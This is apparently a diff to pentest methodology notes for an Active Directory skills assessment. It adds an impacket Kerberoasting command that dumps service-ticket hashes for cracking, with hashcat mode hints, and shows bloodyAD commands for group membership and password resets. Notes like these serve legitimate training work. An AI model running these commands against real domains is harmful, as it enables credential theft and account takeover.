@@ -106,19 +106,23 @@ bloodyAD -u USER -p PASS -d $DOMAIN --host $DC add groupMember 'Helpdesk' me
 
 </Accordion>
 
-<Accordion title="Step 3: Systematic AD Escalation Triage">
+<Accordion title="Step 3: Roasting, Outbound ACL Chain &amp; Lateral Movement">
 
-### Step 3: Systematic AD Escalation Triage
+### Step 3: Roasting, Outbound ACL Chain & Lateral Movement
 
 **AD Enumeration & Attacks: Skills Assessment Hub**
 
 ```bash
+# Kerberoast SPN accounts & check encryption type ($krb5tgs$23$ -> -m 13100, $18$ -> -m 19700)
+impacket-GetUserSPNs 'DOMAIN_FQDN/USER:PASSWORD' -dc-ip DC_IP -request -outputfile part1-kerb.hash
+
+# Fast CLI check for writable AD objects from your current user
 bloodyAD --host DC_IP -d DOMAIN_FQDN -u USER -p 'PASSWORD' get writable
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Attacking Enterprise Networks — Phase 4: Internal Active Directory Enumeration & Lateral Movement](/methodology/enterprise-networks#phase-4-internal-active-directory-enumeration-&-lateral-movement) · [AD Enumeration & Attacks: Skills Assessment Hub — Step 3: Systematic AD Escalation Triage](/active-directory/assessment#step-3-systematic-ad-escalation-triage)
+**Original note sections:** [AD Enumeration & Attacks: Skills Assessment Hub — Step 3: Roasting, Outbound ACL Chain & Lateral Movement](/active-directory/assessment#step-3-roasting-outbound-acl-chain-&-lateral-movement)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -232,6 +236,8 @@ proxychains bloodyAD --host <DC> -d <domain> -u <you> -p '<pass>' set password <
 - [Official documentation 1](https://github.com/CravateRouge/bloodyAD)
 
 {/* VAULT_RELATED_START */}
+
+---
 
 **Source material and related references**
 
